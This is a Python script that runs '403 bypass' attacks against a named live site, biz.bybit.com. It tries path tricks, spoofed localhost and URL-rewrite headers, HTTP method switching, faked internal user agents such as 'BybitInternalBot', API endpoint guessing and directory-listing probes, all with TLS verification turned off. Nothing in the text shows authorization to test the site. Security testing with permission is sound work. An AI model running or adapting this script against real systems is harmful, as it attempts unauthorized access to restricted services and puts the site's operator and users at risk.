#!/usr/bin/env python3
"""
403 Bypass techniques for biz.bybit.com
"""
import requests

TARGET = "https://biz.bybit.com"
requests.packages.urllib3.disable_warnings()

print("="*80)
print("403 BYPASS TESTING - biz.bybit.com")
print("="*80)

# Test 1: Path manipulation
print("\n[1] Path Manipulation")
print("-" * 80)

paths = [
    "/",
    "//",
    "/%2e/",
    "/./",
    "/index.html",
    "/api",
    "/api/",
    "/admin",
    "/login",
    "/dashboard",
]

for path in paths:
    try:
        r = requests.get(f"{TARGET}{path}", verify=False, timeout=3)
        if r.status_code != 403:
            print(f"✓ {path} - {r.status_code}")
            if r.status_code == 200:
                print(f"  Title: {r.text[:200]}")
    except:
        pass

# Test 2: Headers bypass
print("\n[2] Header Bypass")
print("-" * 80)

bypass_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "biz.bybit.com"},
    {"X-Original-URL": "/api"},
    {"X-Rewrite-URL": "/api"},
    {"Referer": "https://bybit.com"},
    {"Origin": "https://bybit.com"},
]

for headers in bypass_headers:
    try:
        r = requests.get(TARGET, headers=headers, verify=False, timeout=3)
        if r.status_code != 403:
            print(f"✓ {list(headers.keys())[0]}: {list(headers.values())[0]} - {r.status_code}")
    except:
        pass

# Test 3: HTTP Methods
print("\n[3] HTTP Method Bypass")
print("-" * 80)

methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]

for method in methods:
    try:
        r = requests.request(method, TARGET, verify=False, timeout=3)
        if r.status_code != 403:
            print(f"✓ {method} - {r.status_code}")
    except:
        pass

# Test 4: User-Agent bypass
print("\n[4] User-Agent Bypass")
print("-" * 80)

user_agents = [
    "BybitInternalBot/1.0",
    "BybitMonitor/1.0",
    "BybitBiz/1.0",
    "curl/7.64.1",
    "Googlebot/2.1",
]

for ua in user_agents:
    try:
        r = requests.get(TARGET, headers={"User-Agent": ua}, verify=False, timeout=3)
        if r.status_code != 403:
            print(f"✓ {ua} - {r.status_code}")
    except:
        pass

# Test 5: API endpoints guess
print("\n[5] API Endpoint Guessing")
print("-" * 80)

api_paths = [
    "/api/v1/health",
    "/api/v1/status",
    "/api/partners",
    "/api/business",
    "/api/affiliate",
    "/api/institutional",
    "/v1/business/register",
    "/business/api/v1/info",
]

for path in api_paths:
    try:
        r = requests.get(f"{TARGET}{path}", verify=False, timeout=3)
        if r.status_code not in [403, 404]:
            print(f"✓ {path} - {r.status_code}")
            try:
                data = r.json()
                print(f"  Response: {str(data)[:150]}")
            except:
                print(f"  Text: {r.text[:100]}")
    except:
        pass

# Test 6: Subdirectories
print("\n[6] Common Subdirectories")
print("-" * 80)

dirs = [
    "/.well-known/",
    "/static/",
    "/assets/",
    "/public/",
    "/files/",
    "/uploads/",
]

for dir in dirs:
    try:
        r = requests.get(f"{TARGET}{dir}", verify=False, timeout=3)
        if r.status_code == 200:
            print(f"✓ {dir} - {r.status_code}")
            if 'Index of' in r.text:
                print(f"  🚨 Directory listing enabled!")
    except:
        pass

print("\n" + "="*80)
